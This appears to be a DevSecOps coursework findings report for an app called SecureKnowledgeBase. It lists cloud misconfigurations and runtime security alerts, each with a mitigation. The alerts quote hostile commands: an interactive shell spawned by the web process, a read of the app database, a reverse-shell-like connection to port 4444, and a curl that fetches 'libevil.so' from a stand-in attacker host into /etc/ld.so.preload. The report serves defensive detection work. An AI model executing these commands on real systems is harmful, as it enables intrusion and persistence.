product.name: SecureKnowledgeBase
product.description: DevSecOps Secure Knowledge Base Coursework Solution

findings.title: Public Ingress to Management Port (aws-vpc-no-public-ingress-sgr)
findings.description: Security group rule allows unrestricted public ingress (0.0.0.0/0) to administrative SSH port 22.
findings.mitigation: Restrict CIDR to specific trusted administrative bastion IP.

findings.title: Unencrypted Block Storage Volume (aws-ebs-enable-volume-encryption)
findings.description: Storage volume encryption at-rest is explicitly disabled.
findings.mitigation: Set encrypted = true on all persistent storage volumes.

findings.title: Publicly Accessible Database Instance (aws-rds-no-public-db-access)
findings.description: Database instance is configured to be publicly accessible from the internet.
findings.mitigation: Set publicly_accessible = false and isolate within private subnet.

findings.title: Spawn Shell in SecureKnowledgeBase Container
findings.description: 13:45:00.124310000: Critical Shell spawned by ASP.NET Core web process (user=appuser proc=bash cmdline=bash -i parent=dotnet pcmdline=dotnet /app/SecureKnowledgeBase.Web.dll container_id=a1b2c3d4e5f6 container_name=skb-app-prod image=secure-knowledge-base:hardened-alpine)
findings.mitigation: Terminate container instance immediately, isolate network segment, inspect upload directory for web-shell artifacts.

findings.title: Unauthorized Access to SecureKnowledgeBase Storage
findings.description: 13:45:02.481920000: Warning Unauthorized process attempted reading application data (user=nobody proc=cat cmdline=cat /app/app_data/secure_knowledge_base.db file=/app/app_data/secure_knowledge_base.db container_id=a1b2c3d4e5f6)
findings.mitigation: Enforce strict Linux DAC/ACL permissions (chmod 600) and AppArmor profile denying file access to foreign binaries.

findings.title: Unexpected Outbound Network Connection
findings.description: 13:45:05.892010000: Notice Outbound network connection to unexpected remote port (user=appuser proc=dotnet connection=10.20.1.5:54321->198.51.100.45:4444 rport=4444 rip=198.51.100.45 container_id=a1b2c3d4e5f6)
findings.mitigation: Block destination IP 198.51.100.45 in egress firewall / Security Group, inspect process stack for reverse shell payload.

findings.title: System Binary Directory Write Attempt
findings.description: 13:45:07.102390000: Critical File modification attempted in system directory (user=root proc=curl file=/etc/ld.so.preload cmdline=curl -o /etc/ld.so.preload http://attacker-site.com/libevil.so container_id=a1b2c3d4e5f6)
findings.mitigation: Enforce read-only root filesystem (--read-only flag in docker run or readOnlyRootFilesystem in Kubernetes SecurityContext).
